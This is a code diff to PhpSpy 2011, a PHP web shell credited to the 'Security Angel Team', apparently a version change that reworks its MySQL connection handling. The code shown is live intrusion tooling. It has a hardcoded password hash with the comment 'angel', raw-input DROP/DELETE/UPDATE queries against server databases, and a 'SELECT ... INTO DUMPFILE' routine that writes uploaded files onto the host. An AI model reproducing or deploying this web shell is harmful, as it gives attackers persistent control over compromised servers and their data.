@@ -21,7 +21,7 @@ foreach($_POST as $key => $value) {
 /*===================== 程序配置 =====================*/
 
 //echo encode_pass('angel');exit;
-//angel = ec38fe2a8497e0a8d6d349b3533038cb
+
 // 如果需要密码验证,请修改登陆密码,留空为不需要验证
 $pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel
 
@@ -113,7 +113,7 @@ if ($doing == 'backupmysql' && !$saveasfile) {
 	if (!$table) {
 		$errmsg ='Please choose the table';
 	} else {
-		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
+		mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
 		$filename = basename($dbname.'.sql');
 		header('Content-type: application/unknown');
 		header('Content-Disposition: attachment; filename='.$filename);
@@ -132,7 +132,7 @@ if($doing=='mysqldown'){
 	if (!$dbname) {
 		$errmsg = 'Please input dbname';
 	} else {
-		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
+		mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
 		if (!file_exists($mysqldlfile)) {
 			$errmsg = 'The file you want Downloadable was nonexistent';
 		} else {
@@ -713,7 +713,7 @@ elseif ($action == 'sqlfile') {
 				@fclose($fp);
 				$contents = bin2hex($contents);
 				if(!$upname) $upname = $file['name'];
-				$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+				mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
 				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
 				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
 			}
@@ -799,7 +799,7 @@ elseif ($action == 'mysqladmin') {
 		if (!$table) {
 			m('Please choose the table');
 		} else {
-			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
 			$fp = @fopen($path,'w');
 			if ($fp) {
 				foreach($table as $k => $v) {
@@ -826,7 +826,7 @@ elseif ($action == 'mysqladmin') {
 			}
 		}
 		if ($keystr && $valstr) {
-			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
 			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
 		}
 	}
@@ -838,19 +838,19 @@ elseif ($action == 'mysqladmin') {
 		}
 		if ($valstr) {
 			$where = base64_decode($base64);
-			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+			mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
 			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
 		}
 	}
 	if ($doing == 'del' && $base64) {
 		$where = base64_decode($base64);
 		$delete_sql = "DELETE FROM $tablename WHERE $where";
-		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+		mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
 		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
 	}
 
 	if ($tablename && $doing == 'drop') {
-		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+		mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
 		if (q("DROP TABLE $tablename")) {
 			m('Drop table of success');
 			$tablename = '';
@@ -913,7 +913,7 @@ elseif ($action == 'mysqladmin') {
 		$page = 1;
 	}
 	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
-		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
+		mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
 		//获取数据库信息
 		$mysqlver = mysql_get_server_info();
 		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
@@ -1576,7 +1576,7 @@ else {
 </td></tr></table>
 <div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
 	<span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
-	Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
+	Powered by <a title="Build 20110419" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
 </div>
 </body>
 </html>
@@ -1978,10 +1978,9 @@ function GetSFileList($dir, $content, $re = 0) {
 }
 
 function qy($sql) { 
-	global $mysqllink;
 	//echo $sql.'<br>';
 	$res = $error = '';
-	if(!$res = @mysql_query($sql,$mysqllink)) { 
+	if(!$res = @mysql_query($sql)) { 
 		return 0;
 	} else if(is_resource($res)) {
 		return 1; 
@@ -1992,8 +1991,7 @@ function qy($sql) {
 }
 
 function q($sql) { 
-	global $mysqllink;
-	return @mysql_query($sql,$mysqllink);
+	return @mysql_query($sql);
 }
 
 function fr($qy){
@@ -2008,13 +2006,13 @@ function sizecount($fileSize) {
 	$sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
 	return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
 }
+
 // 备份数据库
 function sqldumptable($table, $fp=0) {
-	global $mysqllink;
 
 	$tabledump = "DROP TABLE IF EXISTS `$table`;\n";
-	$res = q("SHOW CREATE TABLE $table");
-	$create = mysql_fetch_row($res);
+	$res = q('SHOW CREATE TABLE `'.$table.'`');
+	$create = mysql_fetch_array($res);
 	$tabledump .= $create[1].";\n\n";
 
 	if ($fp) {
@@ -2035,7 +2033,6 @@ function sqldumptable($table, $fp=0) {
 			echo $tabledump;
 		}
 	}
-	fwrite($fp,"\n\n");
 	fr($rows);
 }
 
